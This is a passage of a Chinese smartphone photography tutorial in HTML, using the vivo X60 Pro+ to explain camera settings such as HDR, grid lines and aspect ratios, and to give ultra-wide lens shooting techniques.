zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-1b16d9c0a4c570fb483719ba563349a8_r.jpg\"></figure><p>一个很重要的经验就是，相机中的闪光灯默认的曝光倾向都是为了使面中的主体更亮，所以都会有着一定的过度曝光的倾向。所以为了能够让你的拍摄成功率更好，使用闪光灯时一定要主动的降低画面的曝光。</p>\n<p>直接闪光对于拍摄一些柔和的少女人像可能不太友好。这里也有一个很重要的技巧，就是学会柔光。比如我们可以在闪光灯前罩上一些半透明的介质，甚至是白色的纸巾都可以。这样你会发现补充的光线会自然柔和一些。</p>\n<p>如果说你是一个新手，还是不能很好的驾驭闪光灯，这里的闪光的还有一个很重要的妙用，也就是直接补光。以前在介绍 iPhone 摄影时，这里我需要让大家打开手机的手电筒，这样才能让闪光灯持续点亮，为画面补充光线。弊端是它这需要两台手机的配合，一台补光，一个拍摄。</p>\n<p>但是在 vivo X60 Pro+ 中竟然直接提供了一个补光选项，可以直接常亮，非常贴心。不过如果你的手机没有这个选项，就需要像 iPhone 一样，可以打开手电筒进行补光。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-e45f02efbef994bc2558debf9c5bee4d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"888\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-e45f02efbef994bc2558debf9c5bee4d_r.jpg\"></figure><p><b>HDR 功能</b></p>\n<p>HDR 功能，基本上是如今智能手机的看家本领。很多人在一些场景中会发现几万块的相机拍摄效果甚至是没有几千块的手机效果好，一个重要的因素就是今天手机的智能 HDR 真的实在是太优秀了。</p>\n<p>比如在下面的场景中，我们看到如果我们不开启 HDR ，画面中天空的场景是过曝的，这是因为室内外光线差别太大，相机的宽容度不够，我们只能照顾亮部或者是暗部的其中一个。</p>\n<p>想要暗部清晰，那么亮部就会过曝。</p>\n<p>想要亮部清晰，那么暗部就会死黑。</p>\n<p>而开启 HDR 以后，正如下图所见：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-c1d62442be9d5efe95760c93a9092c4d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-c1d62442be9d5efe95760c93a9092c4d_r.jpg\"></figure><p>暗部有细节，亮部很清晰。</p>\n<p>这还不是今天的手机摄影 HDR 的全部本领，很多手机现在甚至是可以针对画面中的景物 HDR。结论就是：</p>\n<p><b>放心打开使用，不需要关闭。</b></p>\n<p>曝光知识远不止这些，我会在后面的章节中详细阐述。</p>\n<p><b>AI 场景优化</b></p>\n<p>先说结论，我自己是拿到手机的第一刻就会关闭安卓手机上所有所谓的「AI」优化功能。这其中的原因不完全是因为我不信任 AI，恰恰相反，今天的手机 AI 非常聪明，绝大多数情况下都会有很好的效果。而我之所以关闭是因为：</p>\n<p>「我希望拍摄我想要的画面，而不是机器想要的大数据画面。」</p>\n<p>通过前面的审美章节的阐述相信你也知道了，审美是一个很私人的事情。但是所谓的 AI 美化，则是基于大多数人的喜好统计，它并不能代表你的独特审美。的确，大多数人拍摄花朵时，希望花朵更加颜色艳丽，但我可能喜欢花朵更加深沉。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5dbbe5203e2eedc70c04d1f7ce5d021d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-5dbbe5203e2eedc70c04d1f7ce5d021d_r.jpg\"></figure><p>所以，如果你学习这篇文章的目的是更好的摄影表达，就应该关掉 AI。</p>\n<p>但我也知道，很多人的手机摄影只是为了社交网络服务，自己不想花时间后期或者是创作，那么 AI 相当于一个智能管家，帮你直接在拍摄之后做成大家喜欢的样子。</p>\n<p>萝卜青菜，任君选择。</p>\n<p><b>微距开关</b></p>\n<p>首先需要说明的是，不同安卓手机的微距能力是不同的，因此微距效果也不相同。微距镜头其实和普通镜头在设计上有差别。本文举例的 vivo X60 Pro+ 因此给设定了一开关，通过这个按钮可以直接改变镜头的物理特性，从而获得完全不同的最小对焦距离，获得完全不同的微距效果。</p>\n<p>微距拍摄其实是一个非常有趣的领域。对于摄影作品，甚至是广泛意义上的艺术作品来说，陌生感是很重要的艺术特性。而微距摄影之所以独特，就是因为微距摄影给了我们完全不同的观察角度。就算是一片非常普通的树叶，在微距镜头之下也会展现出不一样的精彩。所以我经常会使用微距镜头到处拍拍，你会发现很多看似平平无奇的景物有着完全不同的观感。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-ba46b855dc17381ddde8fc3288678a5c_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-ba46b855dc17381ddde8fc3288678a5c_r.jpg\"><figcaption>使用微距模式拍摄</figcaption></figure><p>点按三条横线以后，我们就会进入二级菜单，在这里有四个选项：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-bb9fd4dec47dd5e5d62d3c1360487fa2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"888\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-bb9fd4dec47dd5e5d62d3c1360487fa2_r.jpg\"></figure><p><b>网格线</b></p>\n<p><b>请你一定要打开网格线，它非常重要。</b>它既是一种你认真对待摄影的态度，也对你的拍摄过程起着重要的帮助，尤其是后面的构图章节。</p>\n<p>而且抛开所谓的进阶构图不谈，这网格线也至少可以让你在拍摄时横平竖直，尤其是一些建筑摄影，绝对是省力且高效。因此，如果你的手机现在没有打开网格线，那么现在请你立刻马上打开手机的网格线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9763abac88d39c65e0b982ae8c15ea39_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"581\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-9763abac88d39c65e0b982ae8c15ea39_r.jpg\"></figure><p><b>倒计时</b></p>\n<p>本身这项功能的出发点是方便一些合影中，拍摄人员可以有时间进入队伍，所以预留了一段时间来触发快门。但是毕竟这种情况相对来说比较少数，所以这项功能很少有人使用。但是这项功能还有一个非常重要的妙用，这就是：</p>\n<p><b>快门线。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d105f383dc95e744edd3c20b6dab361f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic4.zhimg.com/v2-d105f383dc95e744edd3c20b6dab361f_r.jpg\"></figure><p>在后面的章节中，我们会学习到长曝光的技法，一个重要的案例就是星空拍摄。长曝光的一个重要诀窍就是保持相机稳定，但是手机快门是需要点按屏幕，因此即使使用了稳定设备比如三脚架，还是很容易造成机身晃动。因此我们可以设定 3 秒的延时快门，这样按下快门以后，3 秒钟再触发快门，手机就会恢复稳定。</p>\n<p><b>画幅选择</b></p>\n<p>所谓的画幅，就是照片比例。</p>\n<p>其实画幅的选择是跟构图相关联的，因为不同的画幅完全有着不同的构图逻辑。在 vivo X60 Pro+ 中一共提供了 4 种画幅。</p>\n<p><b>1. 4:3 画幅</b></p>\n<p>这是最为常见的照片画幅比例，几乎所有的手机都是统一使用这个比例。</p>\n<p>这个画幅最大的拍摄感受就是画面最为工整，画面有着明确的延伸方向。所以大多数情况，我建议你使用 4:3 的拍摄比例。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-23e2507f9b64c0fd7e41dea85476b2a3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-23e2507f9b64c0fd7e41dea85476b2a3_r.jpg\"></figure><p>而且需要注意的是，绝大多数情况下手机的传感器比例也是 4:3 ，也就是说如果你使用 4:3 的比例进行拍摄，就会充分利用画面中的每一个像素点。而其它的画幅比例，都是在 4:3 的基础上进行裁切，因此都会有着一定的像素损失。所以这也意味着你可以在前期使用 4:3 ，通过后期裁切为其它的任意比例。</p>\n<p><b>2. 全屏画幅</b></p>\n<p>其实这个选项并不是从摄影创作的角度出发的，而是手机屏幕发展的附属产物。因为在过去的某一段时间里，手机进入了全面屏竞赛的阶段，很多厂商为了展现全面屏的优势，提供了整个屏幕取景的方式。我自己非常不喜欢这种取景方式，一方面画面中有很多 UI 遮挡，即使是半透明的，也很影响画面内容的获取。而且另一方面，这会放大手机曲面屏边界不清晰的缺陷，很不利于构图。</p>\n<p>所以我的建议是，永远不要使用。</p>\n<p><b>3. 16:9 画幅</b></p>\n<p>16:9 的比例是视频拍摄的经典比例，所以当你使用 16:9 拍摄照片时，也会获得一种非常独特的电影质感。如果你长时间关注手机摄影的趋势，就应该还会记得，曾经某一段时间流行一个专门的软件，可以帮你照片裁切成 16:9 的同时加一句台词来装作电影截图，风靡一时。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-8722dc2313001801611a0ab3ce49966e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"719\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-8722dc2313001801611a0ab3ce49966e_r.jpg\"></figure><p>但需要承认的是，16:9 其实本身是需要一定驾驭能力的，所以初学者建议不要尝试，也不要过度迷恋所谓的「电影感」。</p>\n<p><b> 4. 方形画幅</b></p>\n<p>我个人是十分喜欢正方形画幅的，而且我也特别推荐入门新手使用正方形构图，因为它「相对简单」。都说摄影是减法的艺术，所以一个简单的简化方式就是「减轻布局的压力」。当我们使用正方形构图时，我们可以很自然的把主体放到画面中间，而不需要考虑主体以外的内容。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-28165baeff85155fb6ad81e7978db1b0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"1280\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-28165baeff85155fb6ad81e7978db1b0_r.jpg\"></figure><p>而且正方形也更适合今天的社交网络，比如最为经典的 Instagram 就是著名的正方形图片社交网络。这也影响了几乎今天所有的图片社交网络。比如我们的微博、微信的图片方格都是正方形。所以如果你使用正方形构图拍摄就意味不会有画面的信息流失。</p>\n<h3>基本设置区</h3>\n<p>在这个区域中，所有的调整是针对整个相机的。而且基本上，只要针对性地设置一次，每次拍摄并不需要单独调整。需要说明的是，不同机型差别较大，但大部分选项重叠，只不过有机型的针对性功能。比如微云态校准，就是 vivo X60 Pro 系列专属。</p>\n<p>所以这里我直接着重说一些通用的设置：</p>\n<p><b>快门声音</b></p>\n<p>很多人认为快门声音的设置是多此一举的，但是实际上，在我看来快门声音可以关闭非常重要。的确，大多数情况下拍摄时配合着快门声音是一种快感。而且我也的确承认，好听的快门声可以满足创作的仪式感。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-febd580d22a6c37e2290449ca69ef10c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-febd580d22a6c37e2290449ca69ef10c_r.jpg\"></figure><p>但是创作是分类别的，如果你的创作需要不打扰，尤其是一些本身环境安静的场所拍摄，那么就一定要关闭快门声音。</p>\n<p>比如当我要进入一些寺庙时，我是一定会关闭快门声音的。但更重要的是，在一些题材的拍摄中，我们仅仅是一种观察者，如果快门声存在反而打破了这种平衡。被拍摄者可能因为快门声音，失去原有的状态。这一点在人文摄影中之至关重要，只要你消失在「无声之中」，他们才会呈现出最自然的状态。</p>\n<p>比如下面这张照片，就是我关掉快门声音，悄悄地坐在主体的身旁拍摄。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-be91ad3cd0b9550596e822393349801d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-be91ad3cd0b9550596e822393349801d_r.jpg\"></figure><p><b>水印</b></p>\n<p>不要在前期拍摄时打开水印。</p>\n<p>我不知道在拍摄的照片中添加水印，是哪一个厂商带起来的，但这绝对是「本末倒置」的行为。很多人认为增加水印会让自己的照片更加高级，我觉得很可笑。因为如果你的照片需要一个水印来提升「所谓的逼格」，那就偏离了你学习摄影的本质。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-2d5492b6ad2bd26f775487b877e26418_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-2d5492b6ad2bd26f775487b877e26418_r.jpg\"></figure><p>况且，前期添加水印还会给你带来技术上的麻烦。因为你会发现，水印的出现就意味着你的作品不能自如地进行二次后期构图。</p>\n<p>因为你需要照顾水印在画面中的比重。而二次构图对于摄影后期来说，可以说是决定性的一环。不仅是构图，调色也是一个要素。手机调色全局调整，也会让水印的颜色发生改变，让画面十分违和。</p>\n<p><b>所以，关掉任何形式的水印。</b></p>\n<p>如果你真的有需要增加水印，也还请后期添加，而不是在拍摄前期添加。</p>\n<p><b>快门触发方式</b></p>\n<p>快门的触发方式一直是我自己的一个「小趣味点」。</p>\n<p>这也是安卓手机一些独特的乐趣。比如 vivo X60 Pro+ 就提供了触屏、语音、手掌等多种拍摄方式。这些拍摄方式本质上是用来解放你的双手进行拍摄。显然，最合适的场景依然是多人的合影，只要架起来就不需要另一个人进行主动拍摄。</p>\n<p>但其实，这些快门的触发方式还有一个非常有用的用法这就是：</p>\n<p><b>更加优雅的自拍。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d14a8fd3145ddca291a5c0f44ef09b19_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-d14a8fd3145ddca291a5c0f44ef09b19_r.jpg\"></figure><p>很多人提到自拍可能会固化地认为某一种类型的，但是广泛的自拍其实也包含对自己的探索。这方面很多画家走在前面，比如说许多画家的自画像，例如梵高。摄影的初期也有类似的案例，比如爱德华·韦斯顿的自拍。因此我们也可以拍摄一些表达自己风格的自拍，这个时候通过「语音快门」就可以实现自行拍摄，并且还不会限制自己在画面中的全身动作。</p>\n<p>如果你读到这里，某种意义上已经完成了一种「热身」。因为这些功能介绍和设置，本质上的确是一种准备工作。但更重要的是，这些功能不是关键，而是辅助。</p>\n<p>真正的核心，咱们现在开始。</p>\n<h2>03. 镜头中的镜头眼</h2>\n<p>这部分内容的表层是：</p>\n<p>掌握不同镜头焦距的拍摄使用。</p>\n<p>但里层是：</p>\n<p>用不同的视角构建画面。</p>\n<p>我们都知道任何一部相机都离不开镜头，而镜头作为相机的「眼睛」，对画面的内容效果起着决定性作用。而这一章节中，我们要学习的就是镜头的一个重要参数：</p>\n<p><b>焦距。</b></p>\n<p>就算你不是专业的摄影师，你也可能或多或少的听说过这个词。而它的具体含义是镜头的光学中心点和传感器的距离。</p>\n<p>听不懂？没关系，你完全不需要听懂，你只要用视觉感受即可。比如下面是一组图，这四张图是使用 vivo X60 Pro+ 上四颗不同焦距的镜头拍摄。你会发现同一主体，四颗镜头就是完全四种不同的感受。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5b371369d3a435066e0463db23a3618d_b.jpg\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic2.zhimg.com/v2-5b371369d3a435066e0463db23a3618d_r.jpg\"><figcaption>超广角镜头（0.6X/等效 14mm）拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-ec327dab085b356e4c66ad37f6157d8f_b.jpg\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-ec327dab085b356e4c66ad37f6157d8f_r.jpg\"><figcaption>广角镜头（1X/等效 23mm）拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a6b50840ffb22b532143e170ad847528_b.jpg\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-a6b50840ffb22b532143e170ad847528_r.jpg\"><figcaption>标准镜头（2X/等效 50mm）拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e6e2c6e5e5fbeb4fe6f9c667567f6092_b.jpg\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic3.zhimg.com/v2-e6e2c6e5e5fbeb4fe6f9c667567f6092_r.jpg\"><figcaption>长焦镜头（5X/等效 125mm）</figcaption></figure><p>焦距有一个衡量数值，一般都是 「mm」 为单位。但是需要说明的是，不同传感器面积的大小，计算方式不同，所以为了统一，摄影师们就有了一个<b>「等效焦距」</b>的概念。</p>\n<p>不同等效焦距的不同效果，我们可以使用下面这张图一目了然的获得，我们会发现：</p>\n<p>焦距越小，画面越广，拍摄得越近。</p>\n<p>焦距越大，画面越窄，拍摄得越远。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b9da7f8bb8f47c6173e5cd6f9f622bae_b.jpg\" data-size=\"normal\" data-rawwidth=\"698\" data-rawheight=\"470\" class=\"origin_image zh-lightbox-thumb\" width=\"698\" data-original=\"https://pic3.zhimg.com/v2-b9da7f8bb8f47c6173e5cd6f9f622bae_r.jpg\"><figcaption>图片来自 Nikon USA © Dave Black</figcaption></figure><p>不过今天的手机镜头并不会直接标注焦距，而是直接用 0.6X、 1X、2X、5X 来展现焦距的变化。但其实每一个倍数都有一个焦距对应，不过不同机型略有不同。而本文举例的 vivo X60 Pro+ 分别对应为：</p>\n<p>14mm、23mm、50mm、125mm。</p>\n<p>需要说明的是，镜头的焦距也分为可变和不可变两种，所以也就有了定焦镜头和变焦镜头。目前来说，几乎所有的主流影像旗舰手机都是搭配「多颗定焦镜头」。这主要是因为变焦镜头必须需要一定的物理空间，在手机的空间中很难实现。</p>\n<p>不过你可能会发现，智能手机在使用时是可以放大缩小变焦的，这其实是一种「障眼法」。目前多镜头手机的变焦都是通过「数字裁切实现」。比如 vivo X60 Pro+ 拍摄的画面如果是等效 20mm 左右大小，那它的画面实际上是 14mm 的画面裁切而成。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-97e600571a2a4a74ed995559e87d90f0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic1.zhimg.com/v2-97e600571a2a4a74ed995559e87d90f0_r.jpg\"></figure><p>这是一个很重要的知识点，因为这解释了你在拍摄时放大画面按常规来说画质会下降，可有的时候画质却突然变好。这是因为此时镜头已经过渡到了另一颗镜头上，而不是较低焦距镜头数值的裁切。这告诉我们一个重要的经验：</p>\n<p>想要最好的画质，就不要粗暴的使用放大缩小的拖动变焦，而是直接点击画面中不同的镜头，直接切换定焦距。就算你想要放大，后期的裁切和手机内部的裁切别无二致，自己后期裁切还能更加自由。</p>\n<p>不过焦距对于画面的影响远不住如此，我们一个一个来。</p>\n<p>依然需要说明，这里使用 vivo X60 Pro+ 作为案例，其它手机可能略有差异。</p>\n<h3>超广角镜头（0.6X/等效焦距 14mm）</h3>\n<p>坦率地说，作为一个专业摄影师，我自己都很难说我可以驾驭超广角，尤其是 14mm 这么广的超广角。这也从另一个侧面说明了今天智能机厂商摄影竞赛的白热化，因为提供的影像规格已经开始溢出。</p>\n<p>不过虽然说使用超广角很难，但是当你真的能够熟练使用超广角镜头时，你会像驯服一匹野马，很有成就感和乐趣。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d4ae4e48f279361942682d99d07baf57_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-d4ae4e48f279361942682d99d07baf57_r.jpg\"></figure><p>很多人其实存在一个误区，认为超广角的奥义在于「广」，也就是画面中拍摄的内容更多。但实际上，摄影师看中超广角的是：</p>\n<p>夸张的透视。</p>\n<p>比如上面超广角的图，我们会发现一个很重要的规律，这就是空间感强烈。在超广角的镜头下画面中的「近大远小」特性会非常明显。而这种非常强烈的近大远小的特性，绝对是一种少见的陌生感。所以这也是为什么如果我们使用超广角拍摄，很容易被叫做「大片」的原因。</p>\n<p>这也是一个很值得探讨的话题，比如说为什么很多照片看起来有艺术感或者是大片感。其中一个很重要的要素就是「不同」，甚至是「怪异的不同」。这些超常规的视觉，会让我们和照片本身突然有了距离感，也正是这个距离产生了美。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-098a25b43b2cb11053e4ade9fb89ed47_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic4.zhimg.com/v2-098a25b43b2cb11053e4ade9fb89ed47_r.jpg\"></figure><p>说远了，说回超广角。超广角镜头另一个重要的特性就是越是靠近画面的边缘越会拉伸，越靠近画面中心越会压缩。听到拉伸和压缩，就要敲黑板了。因为这在人像中，直接影响了身高。</p>\n<p>比如下面这张图，我们会发现姑娘的腿非常的长，就是因为腿在画面边缘，而身体和头在画面中央。相信我，学会了这一招，每个人都是九头身美女。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-60ebea40daf8dd84eb2f79333ea2e9e2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2776\" data-rawheight=\"3701\" class=\"origin_image zh-lightbox-thumb\" width=\"2776\" data-original=\"https://pic3.zhimg.com/v2-60ebea40daf8dd84eb2f79333ea2e9e2_r.jpg\"></figure><p>而当我们了解到超广角的这些特点以后，有以下建议：</p>\n<p><b>掌握三段式拍摄手法</b></p>\n<p>相信你一定看过很多类似的照片，其实我现在只要是一描述，你就一定会在脑海中浮现出类似的照片。这些照片一般来说最远处都是天边的云彩或者是雪山，中间可能是森林或者是草原，而画面的最近处，也就是底部会有一些有意思的石头或者是花朵作为前景。</p>\n<p>而这就是目前风光摄影师们最为常见的拍摄手法，三段式。比如下面这一张照片，就是最为经典的三段式拍摄手法。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a41c5668ba3cea7d49609240ba0596a1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-a41c5668ba3cea7d49609240ba0596a1_r.jpg\"></figure><p>由于这个拍摄手法过于常见，所以我们甚至是很多时候会称之为「风光糖水」。但是这并不一定是贬义词，因为如果大家都采用某一种形式进行拍摄，那这种形式可能就是经典。而摄影师们使用这种三段式拍摄是有其深层原因的，这就是超广角画面中要安排的内容太多了。</p>\n<p>我们使用超广角拍摄时，会发现画面中很容易容纳许多和实际想要的画面不相关的内容。所以这就需要我们合理的安排画面中的内容。而这种三段式的拍摄手法，则是非常合理地把画面直接分割为三个部分，这就是：</p>\n<p><b>远景，中景，和近景。</b></p>\n<p>而其中最重要的部分就是近景。但有意思的是，恰恰近景是最容易被忽视的那一个。几乎所有的职业风光摄影师一半的时间是在去风景的路上，而另一半是在找近景的路上。</p>\n<p>我们可以通过下面这张图来进行一个直接的对比：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-32bb15d815d1a8682a752b1a94637d92_b.jpg\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic3.zhimg.com/v2-32bb15d815d1a8682a752b1a94637d92_r.jpg\"><figcaption>无前景</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d1ec78d1fbce4b598b37963c4baf9571_b.jpg\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-d1ec78d1fbce4b598b37963c4baf9571_r.jpg\"><figcaption>有前景</figcaption></figure><p>你会发现有近景的画面不仅仅是因为近景的加入多了一些层次，更重要的是还让画面中有了一种立体感。</p>\n<p><b>尝试低角度</b></p>\n<p>另一个非常容易造成画面冲击力的方式就是低角度使用超广角。不过这个低角度拍摄并不是超广角的专属。归根到底，这是在说摄影拍摄中角度选取的重要性。</p>\n<p>其实有一定的经验摄影师和小白摄影师有一个很重要的区分点，这就是职业摄影师从来不会「身高摄影」。这个词你可能是第一次听说，那就对了，因为这个词是我自己造的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d66ba0ec16668427e35c7d698ab16e81_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic2.zhimg.com/v2-d66ba0ec16668427e35c7d698ab16e81_r.jpg\"></figure><p>所谓的「身高摄影」，是说很多人拍摄的角度往往完全就是根据它的身高来决定的。大多数人遇到场景时，掏出手机直接就拍摄，所以你会发现拍摄出来的画面大致相同，毫无陌生感。但其实你只要是自己尝试更换一些自己身高以外的角度进行观察和拍摄，你会发现就算是你生活中再普通，再常见的视角都会完全不一样的视觉感受。</p>\n<p>低角度就是一个最好的证明。</p>\n<p>比如下面这张图就是最好的一个案例。画面中的本来是草原上两朵再常见不过的小花，但是当我尝试更换一个角度，从下向上进行拍摄，这两朵小花不仅拥有了透过阳光的质感，你也会发现一种「它们本身努力生长的情感」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-4ad3b511a687a827d114a9cfa4ba1679_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic2.zhimg.com/v2-4ad3b511a687a827d114a9cfa4ba1679_r.jpg\"></figure><p>这就是更换角度的魔力，而其实生活中，这种仅仅是通过更换视角就可以把普通的场景直接变为质感大片的角度随处都是。所以，当你使用超广角时，拿出手机以后不要着急。你先远近高低各不同地找找，也许就会发现很多不一样的角度。</p>\n<p><b>尝试放大趣味点</b></p>\n<p>随着今天摄影师的普及，很多摄影师的名言也逐渐开始普及起来。亚当斯的话就不说了，就连罗伯特·卡帕的「如果你拍得不够好，是因为你拍得不够近」也在今天小有名气。</p>\n<p>不过需要说明的是，这句话罗伯特·卡帕说是有一个范围的，因为它本身是一个战地摄影师（诺曼底登陆拍摄后，胶卷损坏的就是他）。既然是战地摄影师，「胆量」就是一个摄影师的衡量要素。尤其是当时没有现在这么好的长焦系统，摄影师基本上想要拍摄好的画面，自然只有贴近「真实战场」。</p>\n<p>但话虽如此，并不是说这句话对于摄影不重要，恰恰相反，这句话正是指导我进行摄影的诸多方面。</p>\n<p>首先客观上足够近的确可以帮你拥有全新的视觉语言，尤其是超广角。正如前面所说，因为超广角的一个重要特性就是近大远小的特点显著，所以这让超广角镜头有了一种放大镜的感觉。比如下面这张照片：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5f99b621930650e44038f1fba83eea7f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic4.zhimg.com/v2-5f99b621930650e44038f1fba83eea7f_r.jpg\"></figure><p>动物身体的某一部分，因为被超广角放大了，所以整个画面开始变得妙趣横生起来。因此每当有人问起我超广角到底有什么拍摄秘诀的时候，我会说：</p>\n<p><b>「当别人拍高时，你拍低，当比人拍远时，你拍近。」</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7c09a0e61fded0f62a37827ddb19ec5f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic4.zhimg.com/v2-7c09a0e61fded0f62a37827ddb19ec5f_r.jpg\"></figure><p>至于什么是主观上的近，那么我就留在这摄影眼的最后一部分再说吧。</p>\n<h3>广角镜头（1X/等效焦距 